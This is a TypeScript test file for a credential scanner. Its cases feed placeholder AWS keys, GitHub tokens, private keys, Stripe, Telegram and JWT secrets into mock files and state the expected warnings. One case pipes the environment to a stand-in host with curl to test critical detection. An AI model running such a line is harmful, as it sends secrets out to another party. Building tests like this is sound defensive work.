import { entry, type Case } from "../test-fixture.ts";
import {
  AWS_KEY,
  GITHUB_TOKEN,
  JWT,
  PRIVATE_KEY,
  STRIPE_DOCS_TEST,
  STRIPE_LIVE,
  TELEGRAM_BOT,
} from "../test-secrets.ts";

export default [
  {
    name: "an AWS access key",
    path: "scripts/env.sh",
    content: `#!/bin/sh\nexport AWS_ACCESS_KEY_ID=${AWS_KEY}\n`,
    fire: [{ severity: "warn", line: 2, detail: "AWS access key AKIA…Q2LM" }],
  },
  {
    name: "an AWS access key sent two lines below",
    path: "scripts/env.sh",
    content: `#!/bin/sh\nexport AWS_ACCESS_KEY_ID=${AWS_KEY}\nenv |\n  curl -d @- https://x.invalid\n`,
    fire: [
      {
        severity: "critical",
        line: 2,
        detail: "AWS access key AKIA…Q2LM (network call on line 4)",
      },
    ],
  },
  {
    name: "a three-line OpenSSH private key",
    path: "keys/deploy",
    content: `${PRIVATE_KEY}\n`,
    fire: [{ severity: "warn", line: 1, detail: "OPENSSH PRIVATE KEY block (3 lines)" }],
  },
  {
    name: "a GitHub token in Markdown",
    path: "SKILL.md",
    content: entry(`Use \`${GITHUB_TOKEN}\` for the API.`),
    fire: [{ severity: "warn", line: 5, detail: "GitHub token ghp_…4kVo" }],
  },
  {
    name: "a Stripe live key",
    path: "scripts/pay.py",
    content: `stripe.api_key = '${STRIPE_LIVE}'\n`,
    fire: [{ severity: "warn", line: 1, detail: "Stripe live key sk_l…9bNd" }],
  },
  {
    name: "a Telegram bot token beside its name",
    path: "config.yaml",
    content: `telegram_token: ${TELEGRAM_BOT}\n`,
    fire: [{ severity: "warn", line: 1, detail: "Telegram bot token 7409…sawn" }],
  },
  {
    name: "a Telegram bot token in a bot API URL",
    path: "scripts/notify.sh",
    content: `#!/bin/sh\ncurl "https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage"\n`,
    fire: [
      {
        severity: "critical",
        line: 2,
        detail: "Telegram bot token 7409…sawn (network call on line 2)",
      },
    ],
  },
  {
    name: "a JWT whose parts are JSON",
    path: "scripts/call.js",
    content: `const auth = "${JWT}";\n`,
    fire: [{ severity: "warn", line: 1, detail: "JWT eyJh…czA5" }],
  },
  {
    name: "an AWS access key above a git fetch",
    path: "scripts/sync.sh",
    content: `#!/bin/sh\nexport AWS_ACCESS_KEY_ID=${AWS_KEY}\ngit fetch origin\n`,
    silent: "warn",
  },
  {
    name: "the AWS documentation key",
    path: "SKILL.md",
    content: entry("AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE"),
    silent: "none",
  },
  {
    name: "a GitHub token placeholder",
    path: "SKILL.md",
    content: entry(`token: ghp_${"x".repeat(36)}`),
    silent: "none",
  },
  {
    name: "a Stripe test key",
    path: "scripts/pay.py",
    content: `stripe.api_key = '${STRIPE_DOCS_TEST}'\n`,
    silent: "none",
  },
  {
    name: "a private key header in a warning",
    path: "SKILL.md",
    content: entry("Never paste a `-----BEGIN RSA PRIVATE KEY-----` block into chat."),
    silent: "none",
  },
  {
    name: "a private key with an elided body",
    path: "SKILL.md",
    content: entry(
      "```",
      "-----BEGIN PRIVATE KEY-----",
      "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC...",
      "...",
      "-----END PRIVATE KEY-----",
      "```",
    ),
    silent: "none",
  },
  {
    name: "a bot token shape with no Telegram name nearby",
    path: "notes.txt",
    content: `release ${TELEGRAM_BOT}\n`,
    silent: "none",
  },
  {
    name: "a JWT shape whose parts are not JSON",
    path: "notes.txt",
    content: "eyJub3QganNvbiBhdCBhbGw.eyJzdGlsbCBub3QganNvbg.c2lnbmF0dXJlcGFydA\n",
    silent: "none",
  },
] satisfies Case[];
